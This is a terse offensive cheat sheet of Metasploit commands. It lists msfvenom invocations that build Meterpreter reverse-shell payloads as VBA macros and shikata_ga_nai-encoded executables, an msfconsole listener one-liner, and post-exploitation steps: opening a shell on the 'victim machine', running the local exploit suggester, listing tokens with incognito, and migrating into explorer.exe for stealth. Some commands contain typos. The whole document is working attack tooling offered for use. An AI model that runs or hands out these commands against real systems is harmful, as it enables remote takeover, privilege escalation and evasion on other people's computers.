VBA MSF
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9988 -f vba-exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9988 -f vba-psh

Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe

Use listener
msfconsole -q -x "set payload windows/meterpreter/reverse_tcp;use exploit/multi/handler;set LHOST 192.168.1.1;set LPORT 4444;set ExitOnSession false;exploit -j;"

Inteactions with sessions
session -i 1  (means interact with session 1)
shell (Launches cmd on victim machine)
bg (backgrounding current meterpreter session)

PrivEsc Tool
run post/multi/recon/local_exploit_suggester
set SESSIOS 1
load incognito
list tokens -u 

Stealthy Operations
migrate -N explorer.exe
run post/windows/manage/migrate

VBA PowerShell Dropper
VBA Powercat